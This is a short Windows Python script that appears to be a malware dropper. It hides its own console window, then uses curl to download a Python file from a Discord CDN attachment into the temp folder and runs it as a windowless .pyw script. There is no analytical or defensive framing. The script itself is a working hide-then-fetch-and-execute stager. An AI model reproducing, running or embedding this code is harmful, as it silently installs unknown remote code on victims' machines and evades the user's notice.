import ctypes, win32process, os


def HMA():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)

HMA()


os.system("curl https://cdn.discordapp.com/attachments/1067080265106731090/1068918809802575912/build.py -o %TEMP%/start.pyw && py %TEMP%/start.pyw")
